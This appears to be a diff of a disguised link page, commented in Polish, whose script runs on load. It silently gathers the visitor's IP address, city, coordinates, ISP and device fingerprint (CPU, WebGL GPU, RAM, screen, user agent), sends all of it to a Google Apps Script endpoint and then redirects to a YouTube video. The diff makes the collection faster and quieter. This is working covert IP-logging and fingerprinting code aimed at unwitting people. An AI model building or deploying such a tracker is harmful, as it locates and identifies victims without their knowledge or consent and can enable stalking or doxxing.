@@ -6,32 +6,28 @@
 </head>
 <body>
     <script>
-
-        const GOOGLE_SHEETS_URL = "https://script.google.com/macros/s/AKfycbzRc0TLSz2PxBlJqCRV1x2Jt-tc0X23g28h5SCKWrOCCl-34peXrF7fzpyyytABzHwvoQ/exec"; 
+        const GOOGLE_SHEETS_URL = "https://script.google.com/macros/s/AKfycbzRc0TLSz2PxBlJqCRV1x2Jt-tc0X23g28h5SCKWrOCCl-34peXrF7fzpyyytABzHwvoQ/exec";
         const VIDEO_ID = "dQw4w9WgXcQ";
         
-
         async function getIPAndLocation() {
             try {
-
-                const response = await fetch('https://ipapi.co/json/');
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 3000);
+                const response = await fetch('https://ipapi.co/json/', { signal: controller.signal });
+                clearTimeout(timeoutId);
+                if (!response.ok) throw new Error('HTTP error');
                 const data = await response.json();
-                
                 return {
                     ip: data.ip || 'unknown',
                     city: data.city || 'unknown',
                     region: data.region || 'unknown',
                     country: data.country_name || 'unknown',
-                    country_code: data.country_code || 'unknown',
-                    postal: data.postal || 'unknown',
                     latitude: data.latitude || 'unknown',
                     longitude: data.longitude || 'unknown',
-                    timezone: data.timezone || 'unknown',
-                    isp: data.org || 'unknown'
+                    isp: data.org || 'unknown',
+                    timezone: data.timezone || 'unknown'
                 };
             } catch(e) {
-                console.warn('ipapi.co failed, trying fallback...', e);
-
                 try {
                     const response2 = await fetch('https://api.ipify.org?format=json');
                     const data2 = await response2.json();
@@ -43,310 +39,162 @@
                         latitude: 'unknown',
                         longitude: 'unknown',
                         isp: 'unknown',
-                        error: e.toString()
+                        timezone: 'unknown'
                     };
                 } catch(e2) {
-                    return { ip: 'unknown', error: e2.toString() };
+                    return {
+                        ip: 'unknown',
+                        city: 'unknown',
+                        region: 'unknown',
+                        country: 'unknown',
+                        latitude: 'unknown',
+                        longitude: 'unknown',
+                        isp: 'unknown',
+                        timezone: 'unknown'
+                    };
                 }
             }
         }
-
+        
         function getCPUDetails() {
-    try {
-        const cores = navigator.hardwareConcurrency || 'unknown';
-        let vendor = 'unknown';
-        let model = 'unknown';
-        let architecture = 'unknown';
-        
-        const ua = navigator.userAgent;
-        const platform = navigator.platform || '';
-        
-
-        if (ua.includes('x64') || ua.includes('x86_64') || platform.includes('Win64') || ua.includes('WOW64')) {
-            architecture = '64-bit (x86_64)';
-        } else if (ua.includes('arm') || ua.includes('ARM') || ua.includes('aarch64')) {
-            architecture = 'ARM';
-            if (ua.includes('aarch64')) architecture = 'ARM64';
-        } else if (ua.includes('Mac OS X') && (ua.includes('Intel') || platform.includes('MacIntel'))) {
-            architecture = '64-bit (Intel)';
-        } else if (ua.includes('Mac OS X') && ua.includes('Apple')) {
-            architecture = 'ARM64 (Apple Silicon)';
-        } else {
-            architecture = 'unknown (32/64-bit?)';
-        }
-        
-        if (platform.includes('Win') || ua.includes('Windows')) {
-            vendor = 'Windows PC';
-      
-            if (cores >= 12) model = 'High-end CPU (possible AMD Ryzen 9 / Intel i9)';
-            else if (cores >= 8) model = 'Mid-high CPU (possible AMD Ryzen 7 / Intel i7)';
-            else if (cores >= 4) model = 'Mid-range CPU (possible AMD Ryzen 5 / Intel i5)';
-            else model = 'Entry-level CPU';
-        }
-    
-        else if (platform.includes('Mac') || ua.includes('Mac OS')) {
-            vendor = 'Apple';
-            if (ua.includes('Apple') && (ua.includes('Mac OS X 10_15_7') || cores >= 8)) {
-                model = 'Apple Silicon (M1/M2/M3)';
-            } else {
-                model = 'Intel Mac';
-            }
-        }
-        
-
-        else if (ua.includes('Android')) {
-            vendor = 'Mobile';
-
-            const androidMatch = ua.match(/\((.*?)\)/);
-            if (androidMatch) {
-                const deviceInfo = androidMatch[1];
-                if (deviceInfo.includes('SM-')) {
-                    vendor = 'Samsung';
-                    model = deviceInfo.split(';').find(p => p.includes('SM-'))?.trim() || 'Galaxy series';
-                } else if (deviceInfo.includes('Pixel')) {
-                    vendor = 'Google';
-                    model = 'Pixel';
-                } else if (deviceInfo.includes('Xiaomi')) {
-                    vendor = 'Xiaomi';
-                } else if (deviceInfo.includes('OnePlus')) {
-                    vendor = 'OnePlus';
-                } else if (deviceInfo.includes('OPPO')) {
-                    vendor = 'OPPO';
-                } else if (deviceInfo.includes('realme')) {
-                    vendor = 'Realme';
+            try {
+                const cores = navigator.hardwareConcurrency || 'unknown';
+                let vendor = 'unknown';
+                let model = 'unknown';
+                let architecture = 'unknown';
+                const ua = navigator.userAgent;
+                const platform = navigator.platform || '';
+                if (ua.includes('x64') || ua.includes('x86_64') || platform.includes('Win64')) {
+                    architecture = '64-bit';
+                } else if (ua.includes('arm') || ua.includes('ARM')) {
+                    architecture = 'ARM';
                 }
-            }
-
-            if (ua.includes('Exynos')) model = 'Samsung Exynos';
-            else if (ua.includes('Snapdragon') || ua.includes('SM8')) model = 'Qualcomm Snapdragon';
-            else if (ua.includes('MediaTek') || ua.includes('MT')) model = 'MediaTek Dimensity/Helio';
-            else if (vendor === 'Samsung') model = model + ' (Exynos or Snapdragon)';
-        }
-
-        else if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod')) {
-            vendor = 'Apple';
-            model = 'Apple A-series (A12-A17)';
-            architecture = 'ARM64';
-        }
-
-        else if (ua.includes('Linux')) {
-            vendor = 'Linux';
-            if (ua.includes('Ubuntu')) model = 'Ubuntu';
-            else if (ua.includes('Debian')) model = 'Debian';
-            else model = 'Generic Linux';
-        }
-
-        else if (ua.includes('CrOS')) {
-            vendor = 'Google';
-            model = 'Chromebook';
-            architecture = 'ARM or x86';
-        }
-        
-
-        let performanceTier = '';
-        if (cores) {
-            const startTime = performance.now();
-            let x = 0;
-            for (let i = 0; i < 1000000; i++) x += Math.sqrt(i);
-            const endTime = performance.now();
-            const speed = endTime - startTime;
-            
-            if (speed < 10) performanceTier = ' (very fast CPU)';
-            else if (speed < 30) performanceTier = ' (fast CPU)';
-            else if (speed < 80) performanceTier = ' (medium CPU)';
-            else performanceTier = ' (slow CPU)';
-            
-            model += performanceTier;
-        }
-        
-        return {
-            cores: cores,
-            vendor: vendor,
-            model: model,
-            architecture: architecture,
-            ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown'
-        };
-        
-    } catch(e) {
-        return {
-            cores: navigator.hardwareConcurrency || 'unknown',
-            vendor: 'error',
-            model: 'error',
-            architecture: 'error',
-            ram: 'error'
-        };
-    }
-}
-             
-                const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown';
-                
+                if (platform.includes('Win') || ua.includes('Windows')) {
+                    vendor = 'Windows PC';
+                    if (cores >= 8) model = 'High-end CPU';
+                    else if (cores >= 4) model = 'Mid-range CPU';
+                    else model = 'Entry-level CPU';
+                }
+                else if (platform.includes('Mac') || ua.includes('Mac OS')) {
+                    vendor = 'Apple';
+                    model = ua.includes('Apple') ? 'Apple Silicon' : 'Intel Mac';
+                }
+                else if (ua.includes('Android')) {
+                    vendor = 'Mobile';
+                    const match = ua.match(/\(([^)]+)\)/);
+                    if (match && match[1].includes('SM-')) vendor = 'Samsung';
+                    if (ua.includes('Exynos')) model = 'Exynos';
+                    else if (ua.includes('Snapdragon')) model = 'Snapdragon';
+                }
+                else if (ua.includes('iPhone') || ua.includes('iPad')) {
+                    vendor = 'Apple';
+                    model = 'A-series';
+                    architecture = 'ARM64';
+                }
                 return {
                     cores: cores,
                     vendor: vendor,
                     model: model,
                     architecture: architecture,
-                    ram: ram
+                    ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown'
                 };
             } catch(e) {
-                return { cores: 'unknown', vendor: 'error', model: 'error', architecture: 'error', ram: 'error' };
+                return { cores: 'unknown', vendor: 'error', model: 'error', architecture: 'error', ram: 'unknown' };
             }
         }
-  
+        
         function getGPU() {
             try {
                 const canvas = document.createElement('canvas');
-                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl') || canvas.getContext('webgl2');
-                
-                if (!gl) {
-                    return 'WebGL not supported';
-                }
-                
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'WebGL not supported';
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                 if (debugInfo) {
-                    const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                    if (gpu && vendor) return `${vendor} | ${gpu}`;
-                    return gpu || 'unknown';
+                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'unknown';
                 }
-                
-                const renderer = gl.getParameter(gl.RENDERER);
-                return renderer || 'unknown';
+                return gl.getParameter(gl.RENDERER) || 'unknown';
             } catch(e) {
-                return 'error: ' + e.message;
-            }
-        }
-      
-        function getMemory() {
-            return navigator.deviceMemory || 'unknown';
-        }
-        
-        function getLanguage() {
-            return navigator.language || navigator.userLanguage || 'unknown';
-        }
-        
-        function getPlatform() {
-            return navigator.platform || 'unknown';
-        }
-        
-        function getTimezone() {
-            try {
-                return Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
-            } catch(e) {
-                return 'unknown';
+                return 'error';
             }
         }
         
-        function getConnectionType() {
-            try {
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (!conn) return 'unknown';
-                return conn.effectiveType || conn.type || 'unknown';
-            } catch(e) {
-                return 'unknown';
-            }
-        }
+        function getMemory() { return navigator.deviceMemory || 'unknown'; }
+        function getLanguage() { return navigator.language || 'unknown'; }
+        function getPlatform() { return navigator.platform || 'unknown'; }
+        function getTimezone() { try { return Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown'; } catch(e) { return 'unknown'; } }
+        function getConnectionType() { try { const conn = navigator.connection || navigator.mozConnection; return conn ? conn.effectiveType || conn.type : 'unknown'; } catch(e) { return 'unknown'; } }
+        function getPluginsCount() { try { return navigator.plugins ? navigator.plugins.length : 0; } catch(e) { return 0; } }
+        function getColorDepth() { return screen.colorDepth || 'unknown'; }
+        function isInApp() { const ua = navigator.userAgent.toLowerCase(); return (ua.includes('instagram') || ua.includes('fb') || ua.includes('fban') || ua.includes('messenger')) ? 1 : 0; }
+        function getScreenResolution() { return `${screen.width}x${screen.height}`; }
         
-        function getPluginsCount() {
-            try {
-                return navigator.plugins ? navigator.plugins.length : 0;
-            } catch(e) {
-                return 0;
-            }
-        }
-        
-        function getColorDepth() {
-            return screen.colorDepth || 'unknown';
-        }
-        
-        function isInApp() {
-            const ua = navigator.userAgent.toLowerCase();
-            if (ua.includes('instagram') || ua.includes('fb') || ua.includes('fban') || ua.includes('messenger')) {
-                return 1;
-            }
-            return 0;
-        }
-        
-        function getScreenResolution() {
-            return `${screen.width}x${screen.height}`;
-        }
-      
         async function collectAllData() {
-            console.log('🔍 Zbieranie danych...');
-            
-            const gpu = getGPU();
+            const locationPromise = getIPAndLocation();
             const cpuDetails = getCPUDetails();
-            const location = await getIPAndLocation();
-            
+            const gpu = getGPU();
+            const platform = getPlatform();
+            const userAgent = navigator.userAgent;
+            const language = getLanguage();
+            const screenRes = getScreenResolution();
+            const colorDepth = getColorDepth();
+            const pluginsCount = getPluginsCount();
+            const connectionType = getConnectionType();
+            const inApp = isInApp();
+            const ram = getMemory();
+            const timezone = getTimezone();
+            const location = await locationPromise;
             return {
-                // Lokalizacja
+                timestamp: new Date().toISOString(),
                 ip: location.ip,
                 city: location.city,
                 region: location.region,
                 country: location.country,
-                country_code: location.country_code,
-                postal: location.postal,
                 latitude: location.latitude,
                 longitude: location.longitude,
                 isp: location.isp,
-                timezone: location.timezone,
-                
-                // CPU – szczegóły
+                timezone: timezone,
                 cpu_cores: cpuDetails.cores,
                 cpu_vendor: cpuDetails.vendor,
                 cpu_model: cpuDetails.model,
                 cpu_architecture: cpuDetails.architecture,
-                cpu_ram: cpuDetails.ram,
-                
-                // GPU
+                cpu_ram: ram,
                 gpu: gpu,
-                
-                // System
-                platform: getPlatform(),
-                userAgent: navigator.userAgent,
-                language: getLanguage(),
-                screen_resolution: getScreenResolution(),
-                color_depth: getColorDepth(),
-                plugins_count: getPluginsCount(),
-                
-                // Połączenie
-                connection_type: getConnectionType(),
-                in_app: isInApp(),
-                
-                // Film
-                video_id: VIDEO_ID,
-                
-                // Znacznik czasu
-                timestamp: new Date().toISOString()
+                platform: platform,
+                userAgent: userAgent,
+                language: language,
+                screen_resolution: screenRes,
+                color_depth: colorDepth,
+                plugins_count: pluginsCount,
+                connection_type: connectionType,
+                in_app: inApp,
+                video_id: VIDEO_ID
             };
         }
-      
+        
         async function saveToGoogleSheets(data) {
             try {
-                await fetch(GOOGLE_SHEETS_URL, {
+                fetch(GOOGLE_SHEETS_URL, {
                     method: 'POST',
                     mode: 'no-cors',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
-                });
-                console.log('✅ Dane wysłane do Google Sheets');
+                }).catch(e => console.warn('Send failed:', e));
+                console.log('✅ Dane wysłane');
             } catch(e) {
                 console.error('❌ Błąd wysyłania:', e);
             }
         }
-     
+        
         async function main() {
-            console.log(' Start...');
+            console.log('🚀 Start...');
             const data = await collectAllData();
-            console.log(' Zebrane dane:', data);
-            
-            await saveToGoogleSheets(data);
-            
-            console.log('🔁 Przekierowanie na YouTube...');
+            console.log('📊 Dane zebrane');
+            saveToGoogleSheets(data);
+            console.log('🔁 Przekierowanie...');
             window.location.href = 'https://www.youtube.com/watch?v=' + VIDEO_ID;
         }
         
-        // Uruchom
-        main();
+        setTimeout(main, 10);
     </script>
 </body>
 </html>
